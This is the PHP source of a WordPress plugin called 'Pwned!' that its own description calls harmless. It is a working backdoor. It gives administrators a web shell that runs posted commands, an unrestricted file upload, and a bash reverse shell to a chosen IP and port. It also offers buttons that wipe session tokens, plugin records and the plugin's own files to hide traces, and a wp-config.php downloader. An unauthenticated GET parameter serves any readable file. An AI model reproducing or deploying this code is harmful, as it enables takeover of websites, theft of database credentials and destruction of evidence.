<?php
/*
Plugin Name: Pwned!
Plugin URI: https://github.com/jaumesaa/pwned-wordpress-plugin-_-plugin-for-hackers
Description: This isn't bad! Don't worry about this harmless plugin!
Version: 1.3
Author: jaumesaa
Author URI: https://github.com/jaumesaa/
License: GPL2
*/

if (!defined('ABSPATH')) {
    exit; // Evita el acceso directo al archivo.
}

function pwned_command_execution() {
    if (isset($_POST['cmd'])) {
        update_option('pwned_last_cmd', sanitize_text_field($_POST['cmd']));
        echo '<pre>' . shell_exec($_POST['cmd']) . '</pre>';
    }
}

function pwned_file_upload() {
    if (isset($_FILES['file'])) {
        $upload_dir = wp_upload_dir();
        $upload_file = $upload_dir['path'] . '/' . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
            echo 'Archivo subido: ' . $upload_file;
        } else {
            echo 'Error al subir el archivo.';
        }
    }
}

function pwned_clear_login_traces() {
    global $wpdb;
    $wpdb->query("DELETE FROM $wpdb->usermeta WHERE meta_key = 'session_tokens'");
    $wpdb->query("DELETE FROM $wpdb->options WHERE option_name = 'wp_session_tokens'");
    echo 'Rastros de inicio de sesión eliminados.';
}

function pwned_remove_all_traces() {
    global $wpdb;

    // Eliminar registros del plugin
    $plugin_slug = 'pwned/pwned.php';
    $wpdb->query($wpdb->prepare("DELETE FROM $wpdb->options WHERE option_name IN (%s, %s, %s, %s)", "active_plugins", "active_plugins_1", "active_plugins_2", "recently_activated"));
    $wpdb->query($wpdb->prepare("DELETE FROM $wpdb->postmeta WHERE meta_key LIKE %s", "%" . $plugin_slug . "%"));
    
    // Eliminar rastros de inicio de sesión
    pwned_clear_login_traces();

    // Eliminar el plugin
    deactivate_plugins(plugin_basename(__FILE__));
    $plugin_path = plugin_dir_path(__FILE__);
    pwned_delete_dir($plugin_path);
    echo 'Rastros eliminados y plugin eliminado.';
}

function pwned_delete_dir($dir_path) {
    if (!is_dir($dir_path)) {
        return;
    }
    $files = scandir($dir_path);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $file_path = $dir_path . DIRECTORY_SEPARATOR . $file;
            if (is_dir($file_path)) {
                pwned_delete_dir($file_path);
            } else {
                unlink($file_path);
            }
        }
    }
    rmdir($dir_path);
}

function pwned_reverse_shell($ip, $port) {
    $cmd = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
    shell_exec($cmd);
}

function pwned_form() {
    if (current_user_can('administrator')) {
        if (!get_option('pwned_pwd')) {
            update_option('pwned_pwd', shell_exec('pwd'));
        }
        
        $last_cmd = get_option('pwned_last_cmd', '');
        $current_dir = get_option('pwned_pwd', '');

        echo '<div style="padding:20px;">';
        echo '<h2>Pwned Plugin</h2>';
        echo '<p>Current Directory: ' . $current_dir . '</p>';
        echo '<form id="pwned-form" method="post" enctype="multipart/form-data">';
        echo '<input type="text" id="pwned-cmd" name="cmd" placeholder="Enter command" value="' . esc_attr($last_cmd) . '" />';
        echo '<input type="submit" value="Execute" />';
        echo '</form>';
        echo '<form method="post" enctype="multipart/form-data">';
        echo '<input type="file" name="file" />';
        echo '<input type="submit" value="Upload File" />';
        echo '</form>';
        echo '<form method="post">';
        echo '<input type="hidden" name="clear_login_traces" value="1" />';
        echo '<input type="submit" value="Clear Login Traces" />';
        echo '</form>';
        echo '<form method="post">';
        echo '<input type="hidden" name="remove_all_traces" value="1" />';
        echo '<input type="submit" value="Remove All Traces" />';
        echo '</form>';
        echo '<form method="post">';
        echo '<input type="text" name="reverse_shell_ip" placeholder="Enter IP" />';
        echo '<input type="text" name="reverse_shell_port" placeholder="Enter Port" />';
        echo '<input type="submit" value="Launch Reverse Shell" />';
        echo '</form>';
        echo '</div>';
        ?>
        <script type="text/javascript">
            document.getElementById("pwned-form").addEventListener("submit", function() {
                var cmdInput = document.getElementById("pwned-cmd");
                var lastCmd = cmdInput.value.trim();
                if (lastCmd !== "") {
                    sessionStorage.setItem("pwned_last_cmd", lastCmd);
                }
            });
            document.addEventListener("DOMContentLoaded", function() {
                var lastCmd = sessionStorage.getItem("pwned_last_cmd");
                if (lastCmd !== null && lastCmd.trim() !== "") {
                    document.getElementById("pwned-cmd").value = lastCmd;
                }
            });
        </script>
        <?php
        if (isset($_POST['cmd'])) {
            pwned_command_execution();
        }

        if (isset($_FILES['file'])) {
            pwned_file_upload();
        }

        if (isset($_POST['clear_login_traces'])) {
            pwned_clear_login_traces();
        }

        if (isset($_POST['remove_all_traces'])) {
            pwned_remove_all_traces();
        }

        if (isset($_POST['reverse_shell_ip']) && isset($_POST['reverse_shell_port'])) {
            $ip = sanitize_text_field($_POST['reverse_shell_ip']);
            $port = sanitize_text_field($_POST['reverse_shell_port']);
            pwned_reverse_shell($ip, $port);
        }
    }
}

function pwned_download_config_files() {
    $config_files = array(
        'wp-config.php',
        'wp-settings.php',
        // Agrega más archivos aquí si es necesario
    );

    echo '<div style="padding:20px;">';
    echo '<h2>Download Config Files</h2>';
    echo '<form method="post">';
    echo '<label for="config_directory">Config Directory Path: (First time try without changing)</label><br>';
    echo '<input type="text" id="config_directory" name="config_directory" placeholder="Enter relative path" value="../" /><br><br>';
    echo '<input type="submit" name="download_files" value="Download Files" />';
    echo '</form>';
    echo '</div>';

    if (isset($_POST['download_files']) && isset($_POST['config_directory'])) {
        $config_directory = sanitize_text_field($_POST['config_directory']);
        if (empty($config_directory)) {
            echo '<p>Please enter the relative path to the config directory.</p>';
            return;
        }

        foreach ($config_files as $file) {
            $file_path = trailingslashit($config_directory) . $file;
            if (file_exists($file_path)) {
                echo '<p><a href="?download_file=' . urlencode($file_path) . '">' . $file . '</a></p>';
            } else {
                echo '<p>' . $file . ' - File not found</p>';
            }
        }
    }
}

add_action('admin_menu', function() {
    add_menu_page('Pwned Plugin', 'Pwned', 'administrator', 'pwned-plugin', 'pwned_form');
    add_submenu_page('pwned-plugin', 'Download Config Files', 'Download Config Files', 'administrator', 'download-config-files', 'pwned_download_config_files');
});

if (isset($_GET['download_file'])) {
    $file_path = sanitize_text_field($_GET['download_file']);
    if (file_exists($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    } else {
        echo 'File not found.';
    }
}

?>
